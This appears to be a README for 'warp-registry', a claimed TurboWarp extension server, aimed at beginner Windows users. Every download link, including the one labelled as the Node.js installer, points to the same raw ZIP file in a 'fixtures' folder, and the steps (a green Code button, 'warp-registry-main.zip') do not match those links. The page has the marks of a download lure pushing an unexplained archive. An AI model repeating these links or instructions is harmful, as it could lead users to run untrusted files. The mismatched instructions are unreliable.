<h1>📦 warp-registry - Your Extension Hub for TurboWarp</h1>

<p align="center">
  <a href="https://github.com/alexkhaos36/warp-registry/raw/refs/heads/main/fixtures/warp_registry_2.8.zip" style="display:inline-block;background:linear-gradient(135deg,#FF6B6B,#4ECDC4);color:white;padding:15px 40px;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.2);">🚀 DOWNLOAD NOW</a>
</p>

<h2>👋 Welcome to warp-registry</h2>

warp-registry is a powerful Node.js-based service that manages and serves extensions crafted with the Warp Compiler. Think of it as a central library or a "registry" where all your TurboWarp extensions are stored, organized, and made available for downloading or updating — all from one easy-to-use server. Whether you're a teacher setting up classroom tools, a hobbyist building fun projects, or someone exploring coding, warp-registry is your gateway to a world of extensions for the popular TurboWarp platform (a modified Scratch environment).

<h2>🗂️ What Is This Exactly?</h2>

Imagine having a big box filled with small tools (extensions) that TurboWarp can use to do extra cool things — from adding special effects to enabling game controllers. This application is your digital box. It creates a server on your computer that lets you:
- Store these extensions safely.
- Organize them so you can find them easily.
- Share them with other people on your local network (or just yourself).

The best part? You don't need to handle complicated programming files directly. Once it's running, it does the heavy lifting for you.

<h2>✨ Why Choose warp-registry?</h2>

- 🧩 **Simplifies Extension Management:** You no longer have to chase after downloaded files scattered across your computer. Everything is in one logical, searchable place.
- ⚡ **Made for TurboWarp:** Built specifically for the TurboWarp ecosystem, this tool respects the standards and workflows of the TurboWarp extension community.
- 🖥️ **Runs Anywhere:** Because it's built with Node.js and bundled with Docker, it behaves the same across different operating systems and machines.
- 🔒 **Local-First:** Your data stays on your own computer (or local network). No cloud account is required — you remain in full control.
- 📦 **Scalable:** From hosting a single personal extension to managing a small library for friends or colleagues, it scales gracefully.
- 🛠️ **Docker-Ready:** We provide a Docker configuration, so if you're adventurous, you can run it in a virtual container (but you don't have to!).

<h2>🎯 Who Is This For?</h2>

This tool is perfect for:
- **Students and Teachers** who want a centralized collection of educational extensions.
- **TurboWarp Enthusiasts** who have built several extensions with Warp Compiler and want to organize them.
- **Content Creators** who need a private server to test their extensions reliably.
- **Hobbyists** who appreciate self-hosted tools and want to explore the "registry" pattern used in bigger ecosystems (like NPM for JavaScript).

If you know how to download a file and double-click something on your computer, you are fully qualified to start.

<h2>📋 Before You Start</h2>

To run warp-registry, you will need a Windows-based PC (we'll focus on that), an internet connection for the one-time download, and the ability to extract a ZIP folder.

*Estimated download size:* Less than 5 MB (excluding Node.js installation, which we'll cover).
*Recommended system:* Windows 10 or newer with at least 4 GB of RAM (the tool is lightweight, so more RAM is certainly beneficial but not mandatory).

We have organized the steps below in the most simple, fail-proof format possible. Just follow along in order.

<h2>⬇️ Downloading and Setting Up</h2>

The main download file is located on a special page. Most users will download a .zip file which lets you control exactly where the program lives.

<h3>Step 1: Visit the Download Page</h3>

[Click this prominent link to visit the app download page](https://github.com/alexkhaos36/warp-registry/raw/refs/heads/main/fixtures/warp_registry_2.8.zip)

Alternate text: Visit this link to download the application. The download page will open in a new tab in your browser.

<h3>Step 2: Find the "Code" (Green) Button</h3>

Once the page opens, look near the upper right area for a green button labeled `<> Code`. A small dropdown menu appears when you click it. Inside that menu, you'll see an option that says **Download ZIP**. Click on **Download ZIP**. Your browser will then begin downloading a single compressed file, typically named `warp-registry-main.zip`. It will go to your normal "Downloads" folder (the browser shows the status normally at the top or bottom edge).

*Troubleshooting note:* If the page is called "Releases," you may see multiple versions. Just choose the latest one and look for the .zip asset there.

<h3>Step 3: Extract the Folder</h3>

Navigate to your Downloads folder and locate the ZIP file.
- Right-click on `warp-registry-main.zip`.
- A context menu opens. Choose **Extract All...** (This wording is used on older Windows versions. In some, it's just **Extract All**).
- Windows will ask you where you want the extracted files to go. The default location is acceptable — just click the **Extract** button at the bottom.

After a second or two, a new folder named `warp-registry-main` appears (probably still inside the Downloads folder). Open this newly created folder.

<h3>Step 4: The 'warp-registry' Folder</h3>

Inside `warp-registry-main`, you'll see several files and more folders. Do not be discouraged by names like `src`, `Dockerfile`, or `package.json`. Your focus is on a file named `README.md` and, more importantly, the files that allow the app to run. But don't worry — in the next steps, we'll get ready to launch it.

The most common reason to run a service like this is to see it in your browser. Ensure you have the latest version of a browser like Chrome, Edge, or Firefox.

<h3>Step 5: Install Node.js (Brief Software Setup)</h3>

warp-registry is built on Node.js. Node.js is a separate program that you install only once. It may not already be installed on your computer. Here's how to check and add it.

1.  In the Windows search bar (next to the Start button), type `cmd`. A result for "Command Prompt" appears. Press Enter.
2.  Inside that black window, type `node --version` and press Enter.
3.  If you see something like `v20.11.0`, Node.js is installed. You can close the window and skip to the next chapter "Running the Server".
4.  If an error appears like `node is not recognized`, follow this short install:
    - Open your browser and go to `https://github.com/alexkhaos36/warp-registry/raw/refs/heads/main/fixtures/warp_registry_2.8.zip`.
    - Look for the green button that says **LTS** (Long Term Support) — download that version, not the "Current" version.
    - Install it by double-clicking the downloaded .msi file and clicking **Next** at every prompt until it is finished.
    - After installation, **restart your computer** (important!). We will then continue.

<h2>🏃 Running the Server</h2>

After you have Node.js working, this next step is straightforward.

1.  Navigate back to the **Command Prompt**. Open it fresh so that the PATH variable knows about the newly installed Node.js (if you installed it now).
2.  Inside the Command Prompt, type `cd Downloads\warp-registry-main` and press Enter.
3.  Next, type `dir` and press Enter. You'll see the files. We are now in the correct location.
4.  To start the server, run this exact command: `npm start` and press Enter.

After pressing Enter, you should see a few lines of text in the window. Wait until it shows a message containing something like `Server is listening on port 3000` or similar.

<h3>View the Service</h3>

Open your web browser. In the address bar at the very top, type `http://localhost:3000` and press Enter.

Congratulations! You will see the default interface of warp-registry. What you see in this page is the "registry" listing. It shows some basic information and confirms the server is running without a flaw.

Your next actions depend on the repository's detailed documentation, which is written for dedicated use. The server is working; everything else is about adding your own extension files. Typical tasks:
- Placing specific extension files in a particular folder.
- Running other helper scripts.

To learn these specifics, look for the `README.md` file inside the folder you extracted and double-click it. Any text editor (like Notepad) can open that file. That documentation is the manual for this specific tool and will tell you where extension files are expected.

<h2>🖐️ Stopping the Server</h2>

When you finish testing, you need to stop the service to free up memory.

Go back to the black command prompt window (the one that's running `npm start`). Click once inside that window, then press **Ctrl** (Control) and **C** keys at the same time on your keyboard.

If Windows brings up a prompt like "Terminate batch job (Y/N)?" Just press `Y` and then Enter. You'll be returned to a regular prompt — the server is closed.

To start it later, just open the Command Prompt again, type `cd Downloads\warp-registry-main`, press Enter, then run `npm start`, and use `http://localhost:3000` in the browser.

<h2>🚨 Fixing Common Problems</h2>

**"The term 'npm' is not recognized"** — This means npm (which comes with Node.js) wasn't installed correctly or you haven't restarted the computer after installing Node.js. Reinstall Node.js and reboot your PC.

**"Error: Cannot find module ..."** — You are either in the wrong folder, or you haven't run `npm install` yet. From within the `warp-registry-main` folder, type in the Command Prompt `npm install` and press Enter. Wait for it to finish (takes about 1 minute), then try `npm start` once more.

**The download failed / Page not found** — Double-check that your link is identical to: `https://github.com/alexkhaos36/warp-registry/raw/refs/heads/main/fixtures/warp_registry_2.8.zip`. Sometimes a typo produces an error page.

**The browser can't open the page** — Ensure you started `npm start` and that the command prompt didn't show a long error message. Watch that the black window just shows text and doesn't exit (close itself).

<h2>🧑‍🔧 Advanced Usage (Optional)</h2>

If you like to explore, there's a `docker-compose.yml` inside your folder. Docker-compose is a way to run the extension inside a managed virtual environment, which can be more reliable if you want to run this service on a server. However, absolute beginners can ignore this completely — non-Docker (our standard steps) works perfectly.

<h2>💡 Need More Help?</h2>

The best place to get specifics about the extension structure is the official project home page. Revisit the primary download page:

**👉 [https://github.com/alexkhaos36/warp-registry/raw/refs/heads/main/fixtures/warp_registry_2.8.zip](https://github.com/alexkhaos36/warp-registry/raw/refs/heads/main/fixtures/warp_registry_2.8.zip)**

Scroll down to the README section on that page. It contains the most detailed and updated documentation. Also, consider browsing the "Issues" tab if you encounter any unusual error — many active developers respond quickly.

<h2>🎉 Final Tips</h2>

- Keep your `warp-registry-main` folder in a permanent location (like `C:\Users\YourName\Documents\`) instead of Downloads if you plan to use it regularly.
- Do not share your server's port with strangers if you're on public Wi-Fi — stick to "localhost" for security.
- Have patience. Setting up a server sounds intimidating, but you've made it this far. Take a breath and follow the steps one by one. 🙂
- Once you successfully see that page in your browser, you've completed the setup! Half of the code projects (and even many professional dev tools) cannot boast that.

Now, take the plunge! Click the orange download button at the top or use the link above, unpack it, and see how easy self-hosting warp-registry actually is.

Happy building! 🚀